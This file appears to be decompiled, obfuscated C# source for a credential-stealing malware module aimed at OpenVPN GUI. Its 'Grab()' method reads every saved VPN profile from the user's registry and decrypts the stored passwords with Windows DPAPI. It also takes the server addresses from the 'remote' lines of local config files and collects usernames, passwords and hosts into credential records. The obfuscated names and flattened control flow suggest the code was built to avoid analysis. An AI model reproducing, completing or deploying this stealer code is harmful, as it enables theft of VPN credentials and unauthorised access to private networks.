using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using p3N5Y;

namespace ZAZUx;

public class oV4uz : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string RNh
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public oV4uz()
	{
		RNh = "OpenVPN";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			switch (num)
			{
			case 2:
				try
				{
					try
					{
						if (Registry.CurrentUser.OpenSubKey("Software\\OpenVPN-GUI\\configs", writable: true) == null)
						{
							return list;
						}
					}
					catch
					{
						return list;
					}
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\OpenVPN-GUI\\configs", writable: true);
					string[] subKeyNames = registryKey.GetSubKeyNames();
					string[] array = subKeyNames;
					foreach (string text in array)
					{
						try
						{
							RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\OpenVPN-GUI\\configs\\" + text, writable: true);
							string username = Encoding.Unicode.GetString((byte[])registryKey2.GetValue("username"));
							byte[] vxvyuJ = (byte[])registryKey2.GetValue("auth-data");
							byte[] array2 = (byte[])registryKey2.GetValue("entropy");
							Array.Resize(ref array2, array2.Length - 1);
							string password = oTlPp(vxvyuJ, array2);
							list.Add(new ii68
							{
								byIdLuuGZbL = _3Gx7NkpAKN(text),
								S8v = username,
								_9H5rP7hg2 = password,
								oVAe = RNh
							});
						}
						catch
						{
						}
					}
					return list;
				}
				catch
				{
					return new List<ii68>();
				}
			case 1:
				list = new List<ii68>();
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}

	private static string _3Gx7NkpAKN(string TCXV)
	{
		int num = 0;
		int num2 = default;
		string text = default;
		string text2 = default;
		string result = default;
		string[] array = default;
		string[] array2 = default;
		string yJVCoKkX = default;
		while (true)
		{
			if (num == 6)
			{
				num2 = 0;
				num = 7;
			}
			if (num == 3)
			{
				if (!((text != null) & File.Exists(text)))
				{
					goto IL_013f;
				}
				num = 4;
			}
			if (num == 9)
			{
				if (!text2.StartsWith("remote "))
				{
					num2++;
					goto IL_0130;
				}
				num = 10;
			}
			if (num == 10)
			{
				result = text2.Replace("remote ", "");
				num = 11;
			}
			if (num == 8)
			{
				goto IL_00d7;
			}
			goto IL_00ed;
			IL_013f:
			return "";
			IL_00ed:
			if (num == 7)
			{
				goto IL_0130;
			}
			if (num == 11)
			{
				break;
			}
			if (num == 5)
			{
				array = array2;
				num = 6;
			}
			if (num == 2)
			{
				text = _2lY(yJVCoKkX, TCXV);
				num = 3;
			}
			if (num == 4)
			{
				array2 = File.ReadAllLines(text);
				num = 5;
			}
			if (num == 1)
			{
				yJVCoKkX = Environment.GetEnvironmentVariable("USERPROFILE") + "\\OpenVPN\\config\\";
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 12)
			{
				break;
			}
			continue;
			IL_0130:
			if (num2 < array.Length)
			{
				goto IL_00d7;
			}
			goto IL_013f;
			IL_00d7:
			text2 = array[num2];
			num = 9;
			goto IL_00ed;
		}
		return result;
	}

	private static string _2lY(string YJVCoKkX, string Awib13HA)
	{
		int num = 0;
		string[] files = default;
		int num2 = default;
		string text = default;
		string result = default;
		string[] array = default;
		do
		{
			if (num == 5)
			{
				goto IL_0078;
			}
			if (num == 1)
			{
				files = Directory.GetFiles(YJVCoKkX);
				num = 2;
			}
			if (num == 9)
			{
				break;
			}
			if (num == 2)
			{
				if (files.Length <= 0)
				{
					goto IL_0087;
				}
				num = 3;
			}
			if (num == 4)
			{
				num2 = 0;
				num = 5;
			}
			if (num == 7)
			{
				if (!text.Contains(Awib13HA))
				{
					num2++;
					goto IL_0078;
				}
				num = 8;
			}
			if (num == 6)
			{
				goto IL_011c;
			}
			goto IL_0132;
			IL_0087:
			return null;
			IL_0132:
			if (num == 8)
			{
				result = text;
				num = 9;
			}
			if (num == 3)
			{
				array = files;
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_011c:
			text = array[num2];
			num = 7;
			goto IL_0132;
			IL_0078:
			if (num2 >= array.Length)
			{
				goto IL_0087;
			}
			goto IL_011c;
		}
		while (num != 10);
		return result;
	}

	private static string oTlPp(byte[] vxvyuJ, byte[] ALbZ)
	{
		int num = 0;
		while (true)
		{
			if (num == 1)
			{
				if (vxvyuJ == null)
				{
					goto IL_0042;
				}
				num = 2;
			}
			if (num != 3)
			{
				if (num == 2)
				{
					if (vxvyuJ.Length != 0)
					{
						break;
					}
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 4)
				{
					break;
				}
				continue;
			}
			goto IL_0042;
			IL_0042:
			return null;
		}
		try
		{
			return Encoding.Unicode.GetString(ProtectedData.Unprotect(vxvyuJ, ALbZ, (DataProtectionScope)0));
		}
		catch
		{
			return null;
		}
	}
}
